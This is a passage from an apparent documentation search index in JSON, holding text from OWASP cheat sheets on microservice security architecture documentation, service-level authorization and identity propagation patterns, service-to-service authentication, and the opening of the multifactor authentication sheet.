defined above)","title":"Identify \"service-to-service\" asynchronous communications"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#identify-asset-to-storage-relations","text":"Collect information on the parameters listed below related to each \"asset-to-storage\" relation. Parameter name Description Asset name (ID) Asset name (ID) defined above Storage name (ID) Specify storage name (ID) defined above Storage type Specify storage type for the asset, e.g. \"golden source\" or \"cache\"","title":"Identify \"asset-to-storage\" relations"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#create-a-graphical-presentation-of-application-architecture","text":"It is advisable to create graphical presentation of application architecture (building blocks and relations defined above) in form of services call graph or data flow diagram. In order to do that one can use special software tools (e.g. Enterprise Architect) or DOT language . See example of using DOT language here .","title":"Create a graphical presentation of application architecture"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#use-collected-information-in-secure-software-development-practices","text":"Collected information may be useful for doing application security practices, e.g. during defining security requirements, threat modeling or security testing. Sections below contains examples of activities related to securing application architecture (as well as its mapping to OWASP projects) and tips for their implementation using information collected above.","title":"Use collected information in secure software development practices"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#attack-surface-analysis","text":"","title":"Attack surface analysis"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#implementation-tips","text":"To enumerate microservices endpoints that need to be tested during security testing and analyzed during threat modeling analyze data collected under the following sections: Identify and describe application-functionality services (parameter \"API definition\") Identify and describe infrastructure services (parameter \"Link to the service documentation\")","title":"Implementation tips"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#mapping-to-owasp-projects","text":"OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.2 OWASP Attack Surface Analysis Cheat Sheet","title":"Mapping to OWASP projects"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#data-leakage-analysis","text":"","title":"Data leakage analysis"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#implementation-tips_1","text":"To analyze possible data leakage analyze data collected under the following sections: Identify and describe data assets Identify \"service-to-storage\" relations Identify \"service-to-service\" synchronous communications Identify \"service-to-service\" asynchronous communications Identify \"asset-to-storage\" relations","title":"Implementation tips"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#mapping-to-owasp-projects_1","text":"OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.2 OWASP Top 10-2017 A3-Sensitive Data Exposure","title":"Mapping to OWASP projects"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#applications-trust-boundaries-components-and-significant-data-flows-justification","text":"","title":"Application's trust boundaries, components, and significant data flows justification"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#implementation-tips_2","text":"To verify documentation and justification of all the application's trust boundaries, components, and significant data flows analyze data collected under the following sections: Identify and describe application-functionality services Identify and describe infrastructure services Identify and describe data storages Identify and describe message queues Identify \"service-to-storage\" relations Identify \"service-to-service\" synchronous communications Identify \"service-to-service\" asynchronous communications","title":"Implementation tips"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#mapping-to-owasp-projects_2","text":"OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.4","title":"Mapping to OWASP projects"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#analysis-of-the-applications-high-level-architecture","text":"","title":"Analysis of the application's high-level architecture"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#implementation-tips_3","text":"To verify definition and security analysis of the application's high-level architecture and all connected remote services analyze data collected under the following sections: Identify and describe application-functionality services Identify and describe infrastructure services Identify and describe data storages Identify and describe message queues","title":"Implementation tips"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#mapping-to-owasp-projects_3","text":"OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.5","title":"Mapping to OWASP projects"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#implementation-of-centralized-security-controls-verification","text":"","title":"Implementation of centralized security controls verification"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#implementation-tips_4","text":"To verify implementation of centralized, simple (economy of design), vetted, secure, and reusable security controls to avoid duplicate, missing, ineffective, or insecure controls analyze data collected under the section \"Identify and describe infrastructure services\".","title":"Implementation tips"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#mapping-to-owasp-projects_4","text":"OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.1.6","title":"Mapping to OWASP projects"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#enforcement-of-the-principle-of-least-privilege","text":"","title":"Enforcement of the principle of least privilege"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#implementation-tips_5","text":"To define minimally needed microservice permissions analyze data collected under the following sections: Identify and describe application-functionality services (parameter \"API definition\") Identify \"service-to-storage\" relations Identify \"service-to-service\" synchronous communications Identify \"service-to-service\" asynchronous communications","title":"Implementation tips"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#mapping-to-owasp-projects_5","text":"OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.4.3","title":"Mapping to OWASP projects"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#sensitive-data-identification-and-classification","text":"","title":"Sensitive data identification and classification"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#implementation-tips_6","text":"To verify that all sensitive data is identified and classified into protection levels analyze data collected under the following sections: Identify and describe data assets Identify \"asset-to-storage\" relations","title":"Implementation tips"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#mapping-to-owasp-projects_6","text":"OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.8.1","title":"Mapping to OWASP projects"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#application-components-businesssecurity-functions-verification","text":"","title":"Application components business/security functions verification"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#implementation-tips_7","text":"To verify the definition and documentation of all application components in terms of the business or security functions they provide analyze data collected under the following sections (parameter \"Short description\"): Identify and describe application-functionality services Identify and describe infrastructure services","title":"Implementation tips"},{"location":"cheatsheets/Microservices_based_Security_Arch_Doc_Cheat_Sheet.html#mapping-to-owasp-projects_7","text":"OWASP ASVS, V1 \"Architecture, Design and Threat Modeling Requirements\", #1.11.1","title":"Mapping to OWASP projects"},{"location":"cheatsheets/Microservices_security.html","text":"Microservices Security Cheat Sheet \u00b6 Introduction \u00b6 The microservice architecture is being increasingly used for designing and implementing application systems in both cloud-based and on-premise infrastructures, high-scale applications and services. There are many security challenges need to be addressed in the application design and implementation phases. The fundamental security requirements that have to be addressed during design phase are authentication and authorization. Therefore, it is vital for applications security architects to understand and properly use existing architecture patterns to implement authentication and authorization in microservices-based systems. The goal of this cheat sheet is to identify such patterns and to do recommendations for applications security architect on possible way to use it. Table of contents \u00b6 Edge-level authorization Service-level authorization Service-level authorization: existing patterns Decentralized pattern Centralized pattern with single policy decision point Centralized pattern with embedded policy decision point Recommendation on how to implement authorization External entity identity propagation Identity propagation: existing patterns Send the external entity identity as a clear or self-signed data structures Using a data structures signed by a trusted issuer Recommendation on how to implement identity propogation Service-to-service authentication Service-to-service authentication: existing patterns Mutual transport layer security Token based References Edge-level authorization \u00b6 In simple scenario, authorization can happen only at the edge level (API gateway). The API gateway can be leveraged to centralize enforcement of authorization for all downstream microservices, eliminating the need to provide authentication and access control for each of the individual services. In such case, NIST recommends to implement mitigating controls such as mutual authentication to prevent direct, anonymous connections to the internal services (API gateway bypass). It should be noted that authorization at the edge layer has a following limitations : pushing all authorization decisions to API gateway can quickly become hard to manage in complex ecosystems with many roles and access control rules; API gateway may become a single-point-of-decision that may violate \u201cdefense in depth\u201d principle; operation teams typically own the API gateway, so development teams can not directly make authorization changes, slowing down velocity due to the additional communication and process overhead. In most cases, development teams implement authorization in both places -- at the edge level at a coarse level of granularity and service level. To authenticate external entity edge can use access tokens (referenced token or self-contained token) transmitted via HTTP headers (e.g. \u201cCookie\u201d or \u201cAuthorization\u201d) or use mTLS. Service-level authorization \u00b6 Service-level authorization gives each microservice more control to enforce access control policies. For further discussion, we use terms and definitions according with NIST SP 800-162 . The functional components of access control system can be classified following way: Policy Administration Point (PAP) provides a user interface for creating, managing, testing, and debugging access control rules; Policy Decision Point (PDP) computes access decisions by evaluating the applicable access control policy; Policy Enforcement Point (PEP) enforces policy decisions in response to a request from a subject requesting access to a protected object; Policy Information Point (PIP) serves as the retrieval source of attributes, or the data required for policy evaluation to provide the information needed by the PDP to make the decisions. Service-level authorization: existing patterns \u00b6 Decentralized pattern \u00b6 Development team implements PDP and PEP directly at microservice code level. All the access control rules and as well as attributes that need to implement that rule are defined and stored on the each microservice (step 1). When microservice receives (step 2) request along with some authorization metadata (e.g., end user context or requested resource ID), microservice analyzes it (step 3) in order to generate access control policy decision and then enforces authorization (step 4). Existing programming language frameworks allow development teams to implement authorization at the microservice layer. E.g., Spring Security allows developers to enable scopes checking (e.g. using scopes extracted from incoming JWT) in the resource server and use it to enforce authorization. Implementing authorization at the source code level means that the code must be updated whenever development team want to modify authorization logic. Centralized pattern with single policy decision point \u00b6 In that pattern access control rules are defined, stored, and evaluated centrally. Access control rules is defined using PAP (step 1) and delivered to centralized PDP as well as attributes that need to implement that rules (step 2). When a subject invokes microservice endpoint (step 3), microservice code invokes centralized PDP via network call and PDP generates access control policy decision by evaluating the query input against access control rules and attributes (step 4). Based on PDP decision microservice enforce authorization (step 5). To define access control rules development/operation team has to use some language or notation. An example is Extensible Access Control Markup Language (XACML) and Next Generation Access Control (NGAC) that is a standard to implement policy rules description. This pattern badly affects latency due additional network calls of the remote PDP endpoint, but it can be mitigated by caching authorization policy decisions at microservice level. It should be mentioned that PDP must be operated in high-availability mode due to resilience and availability issues. Application security architects should combine it with other patterns (e.g., authorization on API gateway level) in order to enforce \u201cdefense in depth\u201d principle. Centralized pattern with embedded policy decision point \u00b6 In that pattern access control rules are defined centrally but stored and evaluated at microservice level. Access control rules is defined using PAP (step 1) and delivered to embedded PDP as well as attributes that need to implement that rules (step 2). When a subject invokes microservice endpoint (step 3), microservice code invokes PDP and PDP generates access control policy decision by evaluating the query input against access control rules and attributes (step 4). Based on PDP decision microservice enforce authorization (step 5). PDP code in that case can be implemented as microservice built-in library or sidecar in service mesh architecture. Due to possible network/host failures and network latency it is advisable to implement embedded PDP as microservice library or sidecar on the same host with microservice. Embedded PDP usually store authorization policy and policy-related data in-memory to minimize external dependencies during authorization enforcement and get low latency. Main difference from \u201cCentralized pattern with single policy decision point\u201d with caching approach is that authorization decisions do not store on the microservice side, up to date authorization policy are stored on microservice side instead. It should be mentioned that caching authorization decisions may lead to applying outdated authorization rules and access control violations. Netfix presented ( link , link ) a real case of using \u201cCentralized pattern with embedded PDP\u201d pattern to implement authorization on the microservices level. Policy portal and Policy repository is UI-based system for creating, managing and versioning access control rules; Aggregator fetches data used in access control rules from all external sources and keeps it up to date; Distributor pulls access control rules (from Policy repository) and data used in access control rules (from Aggregators) to distribute it among PDPs; PDP (library) asynchronically pulls access control rules and data and keeps it up to date to enforce authorization by PEP component. Recommendation on how to implement authorization \u00b6 To achieve scalability it is not advisable to hardcode authorization policy in source code (decentralized pattern), but use special language to express policy instead. The goal is to externalize/decouple authorization from code, and not just with a gateway/proxy that acts as a checkpoints. Recommended pattern for service-level authorization is \u201cCentralized pattern with embedded PDP\u201d due to its resilience and wide adoption. Authorization solution should be platform-level solution; dedicated team (e.g., Platform security team) must be accountable for development and operation of authorization solution as well as sharing microservice blueprint/library/components that implement authorization among development teams. Authorization solution should be based on widely used solution, because implementing custom solution has following cons: security or engineering team have to build and maintain custom solution; it is necessary to build and maintain client library SDKs for every language used in system architecture; necessity to train every developer on custom authorization service API and integration, and there\u2019s no open source community to source information from. There is a probability that not all access control policy can be enforced by gateways/proxies and shared authorization library/components, so some specific access control rules still have to be implemented on microservice buisnes code level. In order to do that it is advisiable to have and use by microservice development teams simple questionary/check-list to uncover such security requriments and handle its properly during microservice development. It is advisable to implement \u201cdefense in depth\u201d principle enforce authorization on: gateways and proxies level at a coarse level of granularity; microservice level using shared authorization library/components to enforce fine-granted decisions; microservice business code level to implement business-specific access control rules. Access control policy formal procedures like development, approvement, rolling-out must be implemented. External entity identity propagation \u00b6 To make fine-granted authorization decision at the microservice level microservice has to understand caller context (e.g. user ID, user roles/groups). In order to allow internal service layer to enforce authorization edge layer has to propagate authenticated external entity identity (e.g., end user context) along with a request to downstream microservices. One of the simplest way to propagate external entity identity is to re-use the access token received by the edge and pass it to internal microservices. It should be mentioned that approach is highly insecure due to possible external access token leakage and may decrease an attack surface because the communication relies on proprietary token-based system implementation and internal microservices have to understand external access token. This pattern also is not external access token agnostic, i.e. internal services have to support a wide range of authentication techniques to extract identity from different types of external tokens (e.g. JWT, cookie, OpenID Connect token). Identity propagation: existing patterns \u00b6 Send the external entity identity as a clear or self-signed data structures \u00b6 In that approach calling microservice extracts external entity identity from incoming request (e.g. via parsing incoming access token), creates data structure (e.g. JSON or self-signed JWT) with context and passes that on to an internal microservices. In this scenario recipient microservice has to trust the calling microservice -- if the calling microservice want to violate access control rules, it can do so by setting any user/client ID or user roles it wants as the HTTP header. That approach is applicable in a highly trusted environment in which every microservice is developed by trusted development team according with secure software development practices. Using a data structures signed by a trusted issuer \u00b6 In this pattern after the external request is authenticated by authentication service at the edge layer, a data structure representing external entity identity (e.g., contained user ID, user roles/groups or permissions) is generated, signed or encrypted by the trusted issuer and propagated to internal microservices. Netflix presented a real case of using that pattern: structure called \u201cPassport\u201d that contains user ID and its attributes and HMAC protected is created at the edge level for each incoming request, propagated to internal microservices and never exposes outside: Edge authentication service (EAS) obtains secret key from the Key Management System. EAS receives an access token (may be e.g. in a cookie, JWT, OAuth2 token) from incoming request. EAS decrypts the access token, resolves the external entity identity and sends it to the internal services in the signed \u201cPassport\u201d structure. Internal services can extract user identity in order to enforce authorization (e.g. to implement identity-based authorization) using wrappers. If necessary, internal service can propagate \u201cPassport\u201d structure to downstream services in the call chain. It should be mentioned that pattern is external access token agnostic and allows to decouple external entity and its internal representation. Recommendation on how to implement identity propogation \u00b6 In order to implement external access token agnostic and extendable system decouple access tokens issued for external entity from its internal representation. Use single data structure to represent and propagate external entity identity among microservices. Edge-level service has to verify incoming external access token, issue internal entity representation structure and propagate it to downstream services. Using an internal entity representation structure signed (symmetric or asymmetric encryption) by a trusted issuer is recommended pattern adopted by community. Internal entity representation structure should be extensible to enable add more claims that may lead to low latency. Internal entity representation structure must not be exposed outside (e.g., to browser or external device). Service-to-service authentication \u00b6 Existing patterns \u00b6 Mutual transport layer security \u00b6 In mTLS approach each microservice can legitimately identify who it talks to, in addition to achieving confidentiality and integrity of the transmitted data. Each microservice in the deployment has to carry a public/private key pair and uses that key pair to authenticate to the recipient microservices via mTLS. mTLS usually is implemented with a self-hosted Public Key Infrastructure. The main challenges using mTLS are: key provisioning and trust bootstrap, certificate revocation and key rotation. Token based \u00b6 Token based approach works at the application layer. Token is a container and may contain caller ID (microservice ID) and its permissions (scopes). Caller microservice can obtain signed token by invoking special security token service using its own service ID and password and then attaches it to every outgoing requests e.g., via HTTP headers. Called microservice can extract token and validate it online or offline. Online scenario: to validate incoming token microservice invokes centralized service token service via network call; revoked (compromised) token can be detected high latency should be apply to critical requests Offline scenario: to validate incoming token microservice use downloaded service token service public key; revoked (compromised) token may not be detected low latency should be apply to non-critical requests In most cases, token-based authentication works over TLS that provides confidentiality and integrity of data in transit. References \u00b6 NIST Special Publication 800-204 \u201cSecurity Strategies for Microservices-based Application Systems\u201d NIST Special Publication 800-204A \u201cBuilding Secure Microservices-based Applications Using Service-Mesh Architecture\u201d Microservices Security in Action , Prabath Siriwardena and Nuwan Dias, 2020, Manning","title":"Microservices security.md"},{"location":"cheatsheets/Microservices_security.html#microservices-security-cheat-sheet","text":"","title":"Microservices Security Cheat Sheet"},{"location":"cheatsheets/Microservices_security.html#introduction","text":"The microservice architecture is being increasingly used for designing and implementing application systems in both cloud-based and on-premise infrastructures, high-scale applications and services. There are many security challenges need to be addressed in the application design and implementation phases. The fundamental security requirements that have to be addressed during design phase are authentication and authorization. Therefore, it is vital for applications security architects to understand and properly use existing architecture patterns to implement authentication and authorization in microservices-based systems. The goal of this cheat sheet is to identify such patterns and to do recommendations for applications security architect on possible way to use it.","title":"Introduction"},{"location":"cheatsheets/Microservices_security.html#table-of-contents","text":"Edge-level authorization Service-level authorization Service-level authorization: existing patterns Decentralized pattern Centralized pattern with single policy decision point Centralized pattern with embedded policy decision point Recommendation on how to implement authorization External entity identity propagation Identity propagation: existing patterns Send the external entity identity as a clear or self-signed data structures Using a data structures signed by a trusted issuer Recommendation on how to implement identity propogation Service-to-service authentication Service-to-service authentication: existing patterns Mutual transport layer security Token based References","title":"Table of contents"},{"location":"cheatsheets/Microservices_security.html#edge-level-authorization","text":"In simple scenario, authorization can happen only at the edge level (API gateway). The API gateway can be leveraged to centralize enforcement of authorization for all downstream microservices, eliminating the need to provide authentication and access control for each of the individual services. In such case, NIST recommends to implement mitigating controls such as mutual authentication to prevent direct, anonymous connections to the internal services (API gateway bypass). It should be noted that authorization at the edge layer has a following limitations : pushing all authorization decisions to API gateway can quickly become hard to manage in complex ecosystems with many roles and access control rules; API gateway may become a single-point-of-decision that may violate \u201cdefense in depth\u201d principle; operation teams typically own the API gateway, so development teams can not directly make authorization changes, slowing down velocity due to the additional communication and process overhead. In most cases, development teams implement authorization in both places -- at the edge level at a coarse level of granularity and service level. To authenticate external entity edge can use access tokens (referenced token or self-contained token) transmitted via HTTP headers (e.g. \u201cCookie\u201d or \u201cAuthorization\u201d) or use mTLS.","title":"Edge-level authorization"},{"location":"cheatsheets/Microservices_security.html#service-level-authorization","text":"Service-level authorization gives each microservice more control to enforce access control policies. For further discussion, we use terms and definitions according with NIST SP 800-162 . The functional components of access control system can be classified following way: Policy Administration Point (PAP) provides a user interface for creating, managing, testing, and debugging access control rules; Policy Decision Point (PDP) computes access decisions by evaluating the applicable access control policy; Policy Enforcement Point (PEP) enforces policy decisions in response to a request from a subject requesting access to a protected object; Policy Information Point (PIP) serves as the retrieval source of attributes, or the data required for policy evaluation to provide the information needed by the PDP to make the decisions.","title":"Service-level authorization"},{"location":"cheatsheets/Microservices_security.html#service-level-authorization-existing-patterns","text":"","title":"Service-level authorization: existing patterns"},{"location":"cheatsheets/Microservices_security.html#decentralized-pattern","text":"Development team implements PDP and PEP directly at microservice code level. All the access control rules and as well as attributes that need to implement that rule are defined and stored on the each microservice (step 1). When microservice receives (step 2) request along with some authorization metadata (e.g., end user context or requested resource ID), microservice analyzes it (step 3) in order to generate access control policy decision and then enforces authorization (step 4). Existing programming language frameworks allow development teams to implement authorization at the microservice layer. E.g., Spring Security allows developers to enable scopes checking (e.g. using scopes extracted from incoming JWT) in the resource server and use it to enforce authorization. Implementing authorization at the source code level means that the code must be updated whenever development team want to modify authorization logic.","title":"Decentralized pattern"},{"location":"cheatsheets/Microservices_security.html#centralized-pattern-with-single-policy-decision-point","text":"In that pattern access control rules are defined, stored, and evaluated centrally. Access control rules is defined using PAP (step 1) and delivered to centralized PDP as well as attributes that need to implement that rules (step 2). When a subject invokes microservice endpoint (step 3), microservice code invokes centralized PDP via network call and PDP generates access control policy decision by evaluating the query input against access control rules and attributes (step 4). Based on PDP decision microservice enforce authorization (step 5). To define access control rules development/operation team has to use some language or notation. An example is Extensible Access Control Markup Language (XACML) and Next Generation Access Control (NGAC) that is a standard to implement policy rules description. This pattern badly affects latency due additional network calls of the remote PDP endpoint, but it can be mitigated by caching authorization policy decisions at microservice level. It should be mentioned that PDP must be operated in high-availability mode due to resilience and availability issues. Application security architects should combine it with other patterns (e.g., authorization on API gateway level) in order to enforce \u201cdefense in depth\u201d principle.","title":"Centralized pattern with single policy decision point"},{"location":"cheatsheets/Microservices_security.html#centralized-pattern-with-embedded-policy-decision-point","text":"In that pattern access control rules are defined centrally but stored and evaluated at microservice level. Access control rules is defined using PAP (step 1) and delivered to embedded PDP as well as attributes that need to implement that rules (step 2). When a subject invokes microservice endpoint (step 3), microservice code invokes PDP and PDP generates access control policy decision by evaluating the query input against access control rules and attributes (step 4). Based on PDP decision microservice enforce authorization (step 5). PDP code in that case can be implemented as microservice built-in library or sidecar in service mesh architecture. Due to possible network/host failures and network latency it is advisable to implement embedded PDP as microservice library or sidecar on the same host with microservice. Embedded PDP usually store authorization policy and policy-related data in-memory to minimize external dependencies during authorization enforcement and get low latency. Main difference from \u201cCentralized pattern with single policy decision point\u201d with caching approach is that authorization decisions do not store on the microservice side, up to date authorization policy are stored on microservice side instead. It should be mentioned that caching authorization decisions may lead to applying outdated authorization rules and access control violations. Netfix presented ( link , link ) a real case of using \u201cCentralized pattern with embedded PDP\u201d pattern to implement authorization on the microservices level. Policy portal and Policy repository is UI-based system for creating, managing and versioning access control rules; Aggregator fetches data used in access control rules from all external sources and keeps it up to date; Distributor pulls access control rules (from Policy repository) and data used in access control rules (from Aggregators) to distribute it among PDPs; PDP (library) asynchronically pulls access control rules and data and keeps it up to date to enforce authorization by PEP component.","title":"Centralized pattern with embedded policy decision point"},{"location":"cheatsheets/Microservices_security.html#recommendation-on-how-to-implement-authorization","text":"To achieve scalability it is not advisable to hardcode authorization policy in source code (decentralized pattern), but use special language to express policy instead. The goal is to externalize/decouple authorization from code, and not just with a gateway/proxy that acts as a checkpoints. Recommended pattern for service-level authorization is \u201cCentralized pattern with embedded PDP\u201d due to its resilience and wide adoption. Authorization solution should be platform-level solution; dedicated team (e.g., Platform security team) must be accountable for development and operation of authorization solution as well as sharing microservice blueprint/library/components that implement authorization among development teams. Authorization solution should be based on widely used solution, because implementing custom solution has following cons: security or engineering team have to build and maintain custom solution; it is necessary to build and maintain client library SDKs for every language used in system architecture; necessity to train every developer on custom authorization service API and integration, and there\u2019s no open source community to source information from. There is a probability that not all access control policy can be enforced by gateways/proxies and shared authorization library/components, so some specific access control rules still have to be implemented on microservice buisnes code level. In order to do that it is advisiable to have and use by microservice development teams simple questionary/check-list to uncover such security requriments and handle its properly during microservice development. It is advisable to implement \u201cdefense in depth\u201d principle enforce authorization on: gateways and proxies level at a coarse level of granularity; microservice level using shared authorization library/components to enforce fine-granted decisions; microservice business code level to implement business-specific access control rules. Access control policy formal procedures like development, approvement, rolling-out must be implemented.","title":"Recommendation on how to implement authorization"},{"location":"cheatsheets/Microservices_security.html#external-entity-identity-propagation","text":"To make fine-granted authorization decision at the microservice level microservice has to understand caller context (e.g. user ID, user roles/groups). In order to allow internal service layer to enforce authorization edge layer has to propagate authenticated external entity identity (e.g., end user context) along with a request to downstream microservices. One of the simplest way to propagate external entity identity is to re-use the access token received by the edge and pass it to internal microservices. It should be mentioned that approach is highly insecure due to possible external access token leakage and may decrease an attack surface because the communication relies on proprietary token-based system implementation and internal microservices have to understand external access token. This pattern also is not external access token agnostic, i.e. internal services have to support a wide range of authentication techniques to extract identity from different types of external tokens (e.g. JWT, cookie, OpenID Connect token).","title":"External entity identity propagation"},{"location":"cheatsheets/Microservices_security.html#identity-propagation-existing-patterns","text":"","title":"Identity propagation: existing patterns"},{"location":"cheatsheets/Microservices_security.html#send-the-external-entity-identity-as-a-clear-or-self-signed-data-structures","text":"In that approach calling microservice extracts external entity identity from incoming request (e.g. via parsing incoming access token), creates data structure (e.g. JSON or self-signed JWT) with context and passes that on to an internal microservices. In this scenario recipient microservice has to trust the calling microservice -- if the calling microservice want to violate access control rules, it can do so by setting any user/client ID or user roles it wants as the HTTP header. That approach is applicable in a highly trusted environment in which every microservice is developed by trusted development team according with secure software development practices.","title":"Send the external entity identity as a clear or self-signed data structures"},{"location":"cheatsheets/Microservices_security.html#using-a-data-structures-signed-by-a-trusted-issuer","text":"In this pattern after the external request is authenticated by authentication service at the edge layer, a data structure representing external entity identity (e.g., contained user ID, user roles/groups or permissions) is generated, signed or encrypted by the trusted issuer and propagated to internal microservices. Netflix presented a real case of using that pattern: structure called \u201cPassport\u201d that contains user ID and its attributes and HMAC protected is created at the edge level for each incoming request, propagated to internal microservices and never exposes outside: Edge authentication service (EAS) obtains secret key from the Key Management System. EAS receives an access token (may be e.g. in a cookie, JWT, OAuth2 token) from incoming request. EAS decrypts the access token, resolves the external entity identity and sends it to the internal services in the signed \u201cPassport\u201d structure. Internal services can extract user identity in order to enforce authorization (e.g. to implement identity-based authorization) using wrappers. If necessary, internal service can propagate \u201cPassport\u201d structure to downstream services in the call chain. It should be mentioned that pattern is external access token agnostic and allows to decouple external entity and its internal representation.","title":"Using a data structures signed by a trusted issuer"},{"location":"cheatsheets/Microservices_security.html#recommendation-on-how-to-implement-identity-propogation","text":"In order to implement external access token agnostic and extendable system decouple access tokens issued for external entity from its internal representation. Use single data structure to represent and propagate external entity identity among microservices. Edge-level service has to verify incoming external access token, issue internal entity representation structure and propagate it to downstream services. Using an internal entity representation structure signed (symmetric or asymmetric encryption) by a trusted issuer is recommended pattern adopted by community. Internal entity representation structure should be extensible to enable add more claims that may lead to low latency. Internal entity representation structure must not be exposed outside (e.g., to browser or external device).","title":"Recommendation on how to implement identity propogation"},{"location":"cheatsheets/Microservices_security.html#service-to-service-authentication","text":"","title":"Service-to-service authentication"},{"location":"cheatsheets/Microservices_security.html#existing-patterns","text":"","title":"Existing patterns"},{"location":"cheatsheets/Microservices_security.html#mutual-transport-layer-security","text":"In mTLS approach each microservice can legitimately identify who it talks to, in addition to achieving confidentiality and integrity of the transmitted data. Each microservice in the deployment has to carry a public/private key pair and uses that key pair to authenticate to the recipient microservices via mTLS. mTLS usually is implemented with a self-hosted Public Key Infrastructure. The main challenges using mTLS are: key provisioning and trust bootstrap, certificate revocation and key rotation.","title":"Mutual transport layer security"},{"location":"cheatsheets/Microservices_security.html#token-based","text":"Token based approach works at the application layer. Token is a container and may contain caller ID (microservice ID) and its permissions (scopes). Caller microservice can obtain signed token by invoking special security token service using its own service ID and password and then attaches it to every outgoing requests e.g., via HTTP headers. Called microservice can extract token and validate it online or offline. Online scenario: to validate incoming token microservice invokes centralized service token service via network call; revoked (compromised) token can be detected high latency should be apply to critical requests Offline scenario: to validate incoming token microservice use downloaded service token service public key; revoked (compromised) token may not be detected low latency should be apply to non-critical requests In most cases, token-based authentication works over TLS that provides confidentiality and integrity of data in transit.","title":"Token based"},{"location":"cheatsheets/Microservices_security.html#references","text":"NIST Special Publication 800-204 \u201cSecurity Strategies for Microservices-based Application Systems\u201d NIST Special Publication 800-204A \u201cBuilding Secure Microservices-based Applications Using Service-Mesh Architecture\u201d Microservices Security in Action , Prabath Siriwardena and Nuwan Dias, 2020, Manning","title":"References"},{"location":"cheatsheets/Multifactor_Authentication_Cheat_Sheet.html","text":"Multifactor Authentication Cheat Sheet \u00b6 Introduction \u00b6 Multifactor authentication (MFA), or Two-Factor Authentication (2FA) is when a user is required to present more than one type of evidence in order to authenticate on a system. There are four different types of evidence (or factors) that can be used, listed in the table below: Factor Examples Something You Know Passwords, PINs and security questions. Something You Have Hardware or software tokens, certificates, email, SMS and phone calls. Something You Are Fingerprints, facial recognition, iris scans and handprint scans. Location Source IP ranges and geolocation It should be emphasised that while requiring multiple examples of a single factor (such as needing both a password and a PIN) does not constitute MFA , although it may provide some security benefits over a simple password. Additionally, while the following sections discuss the disadvantage and weaknesses of various different types of MFA, in many cases these are only relevant against targeted attacks. Any MFA is better than no MFA . Advantages \u00b6 The most common way that user accounts get compromised on applications is through weak, re-used or stolen passwords. Despite any technical security controls implemented on the application, users are liable to choose weak passwords, or to use the same password on different applications. As developers or system administrators, it should be assumed that users' passwords will be compromised as some point, and the system should be designed in order to defend against this. Multi-factor authentication (MFA) is by far the best defense against the majority of password-related attacks, including brute-force, credential stuffing and password spraying, with analysis by Microsoft suggesting that it would have stopped 99.9% of account compromises . Disadvantages \u00b6 The biggest disadvantage of MFA is the increase in management complexity for both administrators and end users. Many less technical users may find it difficult to configure and use MFA. Additionally, there are a number of other common issues encountered: Types of MFA that require users to have specific hardware can introduce significant costs and administrative overheads. Users may become locked out of their accounts if they lose or are unable to use their other factors. MFA introduces additional complexity into the application. Many MFA solutions add external dependencies to systems, which can introduce security vulnerabilities or single points of failure. Processes implemented to allow users to bypass or reset MFA may be exploitable by attackers. Requiring MFA may prevent some users from accessing the application. Quick Recommendations \u00b6 Exactly when and how MFA is implemented in an application will vary on a number of different factors, including the threat model of the application, the technical level of the users, and the level of administrative control over the users. These need to be considered on a per-application basis. However, the following recommendations are generally appropriate for most applications, and provide an initial starting point to consider. Provide the option for users to enable MFA on their accounts using TOTP . Require MFA for administrative or other high privileged users. Consider whitelisting corporate IP ranges so that MFA is not required from them. Allow the user to remember the use of MFA in their browser, so they are not prompted every time they login. Implement a secure process to allow users to reset their MFA. Implementing MFA \u00b6 When to Require MFA \u00b6 The most important place to require MFA on an application is when the user logs in. However, depending on the functionality available, it may also be appropriate to require MFA for performing sensitive actions, such as: Changing passwords or security questions. Changing the email address associated with the account. Disabling MFA. Elevating a user session to an administrative session. If the application provides multiple ways for a user to authenticate these should all require MFA, or have other protections implemented. A common area that is missed is if the application provides a separate API that can be used to login, or has an associated mobile application. Improving Usability \u00b6 Having to frequently login with MFA creates an additional burden for users, and may cause them to disable MFA on the application. A number of mechanisms can be used to try and reduce the 